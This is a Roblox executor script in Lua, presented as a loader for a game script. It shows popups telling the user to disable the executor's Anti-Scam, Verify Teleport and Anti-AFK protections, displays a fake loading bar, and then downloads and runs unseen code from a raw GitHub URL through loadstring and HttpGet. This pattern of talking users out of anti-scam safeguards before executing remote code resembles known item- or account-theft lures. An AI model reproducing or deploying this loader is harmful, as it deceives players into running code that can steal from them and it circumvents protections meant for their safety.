--// UI + Detection Script (Edited for SpeedHubX)

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

--// Create Main ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = player:WaitForChild("PlayerGui")

--// First Panel (Instruction Popup)
local FirstFrame = Instance.new("Frame")
FirstFrame.Size = UDim2.new(0, 400, 0, 250)
FirstFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
FirstFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
FirstFrame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -20, 0, 40)
Title.Position = UDim2.new(0, 10, 0, 10)
Title.BackgroundTransparency = 1
Title.Text = "Turn off all the following Delta settings, or the script will fail."
Title.TextColor3 = Color3.fromRGB(255, 0, 0)
Title.TextSize = 16
Title.Font = Enum.Font.SourceSansBold
Title.TextWrapped = true
Title.Parent = FirstFrame

local Instructions = Instance.new("TextLabel")
Instructions.Size = UDim2.new(1, -20, 0, 100)
Instructions.Position = UDim2.new(0, 10, 0, 60)
Instructions.BackgroundTransparency = 1
Instructions.Text = "• Disable Anti-AFK\n• Disable Verify Teleport\n• Disable Anti-Scam\n\nAfter disabling, tick the box to continue."
Instructions.TextColor3 = Color3.fromRGB(255, 255, 255)
Instructions.TextSize = 16
Instructions.Font = Enum.Font.SourceSans
Instructions.TextWrapped = true
Instructions.TextYAlignment = Enum.TextYAlignment.Top
Instructions.Parent = FirstFrame

-- Checkbox
local CheckBox = Instance.new("TextButton")
CheckBox.Size = UDim2.new(0, 20, 0, 20)
CheckBox.Position = UDim2.new(0, 10, 1, -40)
CheckBox.Text = ""
CheckBox.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
CheckBox.Parent = FirstFrame

local CheckMark = Instance.new("TextLabel")
CheckMark.Size = UDim2.new(1, 0, 1, 0)
CheckMark.BackgroundTransparency = 1
CheckMark.Text = "✔"
CheckMark.TextColor3 = Color3.fromRGB(0, 255, 0)
CheckMark.Visible = false
CheckMark.Parent = CheckBox

-- Confirm Button
local ConfirmButton = Instance.new("TextButton")
ConfirmButton.Size = UDim2.new(0, 100, 0, 40)
ConfirmButton.Position = UDim2.new(1, -120, 1, -50)
ConfirmButton.Text = "Confirm"
ConfirmButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
ConfirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ConfirmButton.Font = Enum.Font.SourceSansBold
ConfirmButton.TextSize = 18
ConfirmButton.AutoButtonColor = false
ConfirmButton.Active = false
ConfirmButton.Parent = FirstFrame

--// Warning Popup (when detection fails)
local WarningFrame = Instance.new("Frame")
WarningFrame.Size = UDim2.new(0, 420, 0, 150)
WarningFrame.Position = UDim2.new(0.5, -210, 0.5, -75)
WarningFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
WarningFrame.Visible = false
WarningFrame.Parent = ScreenGui

local WarningText = Instance.new("TextLabel")
WarningText.Size = UDim2.new(1, -20, 1, -20)
WarningText.Position = UDim2.new(0, 10, 0, 10)
WarningText.BackgroundTransparency = 1
WarningText.Text = "Your executor might still have Verify Teleport / Anti-Scam enabled. Please disable these. REJOIN for the script to take effect"
WarningText.TextColor3 = Color3.fromRGB(255, 255, 255)
WarningText.TextSize = 16
WarningText.Font = Enum.Font.SourceSansBold
WarningText.TextWrapped = true
WarningText.Parent = WarningFrame

--// Loading Screen
local LoadingFrame = Instance.new("Frame")
LoadingFrame.Size = UDim2.new(0, 400, 0, 150)
LoadingFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
LoadingFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
LoadingFrame.Visible = false
LoadingFrame.Parent = ScreenGui

local LoadingText = Instance.new("TextLabel")
LoadingText.Size = UDim2.new(1, 0, 0, 40)
LoadingText.Position = UDim2.new(0, 0, 0, 10)
LoadingText.BackgroundTransparency = 1
LoadingText.Text = "Loading GAG Script..."
LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingText.TextSize = 18
LoadingText.Font = Enum.Font.SourceSansBold
LoadingText.Parent = LoadingFrame

local ProgressBarBg = Instance.new("Frame")
ProgressBarBg.Size = UDim2.new(1, -40, 0, 20)
ProgressBarBg.Position = UDim2.new(0, 20, 0.5, -10)
ProgressBarBg.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
ProgressBarBg.Parent = LoadingFrame

local ProgressBar = Instance.new("Frame")
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
ProgressBar.Parent = ProgressBarBg

local Percentage = Instance.new("TextLabel")
Percentage.Size = UDim2.new(1, 0, 0, 30)
Percentage.Position = UDim2.new(0, 0, 1, -30)
Percentage.BackgroundTransparency = 1
Percentage.Text = "0%"
Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
Percentage.TextSize = 16
Percentage.Font = Enum.Font.SourceSansBold
Percentage.Parent = LoadingFrame

--// Functions
local checked = false
CheckBox.MouseButton1Click:Connect(function()
    checked = not checked
    CheckMark.Visible = checked
    if checked then
        ConfirmButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
        ConfirmButton.Active = true
    else
        ConfirmButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
        ConfirmButton.Active = false
    end
end)

-- Detection Check
local function runChecks()
    -- Fake teleport check (won’t rejoin)
    local tpSuccess = pcall(function()
        TeleportService:GetLocalPlayerTeleportData()
    end)

    -- Http check
    local httpSuccess = pcall(function()
        game:HttpGet("https://httpbin.org/get")
    end)

    if not tpSuccess or not httpSuccess then
        return false
    end

    return true
end

-- Confirm Button Logic
ConfirmButton.MouseButton1Click:Connect(function()
    if not checked then return end

    FirstFrame.Visible = false
    task.wait(0.2)

    if runChecks() then
        -- Passed checks → Loading
        LoadingFrame.Visible = true
        for i = 1, 100 do
            ProgressBar.Size = UDim2.new(i/100, 0, 1, 0)
            Percentage.Text = i.."%"
            task.wait(0.05) -- 5 seconds total
        end
        LoadingFrame.Visible = false

        -- Run your external script after loading
        loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")

    else
        -- Failed check → Warning popup
        WarningFrame.Visible = true
    end
end)


